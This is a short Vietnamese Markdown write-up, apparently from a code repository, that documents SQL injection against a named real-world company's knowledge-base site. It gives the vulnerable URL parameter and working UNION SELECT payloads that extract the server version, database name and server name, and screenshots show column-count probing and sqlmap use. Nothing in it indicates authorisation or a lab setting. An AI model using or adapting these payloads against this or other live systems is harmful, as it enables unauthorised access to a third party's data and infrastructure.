# TỔNG QUAN # 

Kiểm tra trên web "Caldigit" `https://archive.caldigit.com/kb/index.asp?KBID=1&viewlocale=1`

![image](https://github.com/user-attachments/assets/ece2a38c-25a3-4e39-924d-85c05bd67fb9)

## CÁC BƯỚC

* [Dò tìm số cột](#dò-tìm-số-cột)
* [Kiểm tra database, version, user](#kiểm-tra-database-version-user)
* [Sử dụng `sqlmap`](#sử-dụng-sqlmap)

## Dò tìm số cột

![image](https://github.com/user-attachments/assets/69fdac4a-fb12-4d86-b02a-f75429732a28)

![image](https://github.com/user-attachments/assets/06b007b9-fe05-4313-979d-94697f50b1cc)

## Kiểm tra database, version, user 

`https://archive.caldigit.com/kb/index.asp?KBID=1&viewlocale=-1+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,@@version,14`

![image](https://github.com/user-attachments/assets/f4eb769c-a3ba-4643-9926-f0bad96b0331)

`https://archive.caldigit.com/kb/index.asp?KBID=1&viewlocale=-1+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,db_name(),14`

![image](https://github.com/user-attachments/assets/953241ba-a329-4eb9-8b4e-58ae4027aca9)

`https://archive.caldigit.com/kb/index.asp?KBID=1&viewlocale=-1+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,@@SERVERNAME,14`

![image](https://github.com/user-attachments/assets/c9e0f215-04f7-4956-9bad-f5d9c29a2475)

## Sử dụng `sqlmap`

![image](https://github.com/user-attachments/assets/ff1a0c80-9f64-4730-b856-9cd0c08a970f)

![image](https://github.com/user-attachments/assets/5de14fc1-7a05-452c-99c5-674a90faea5e)


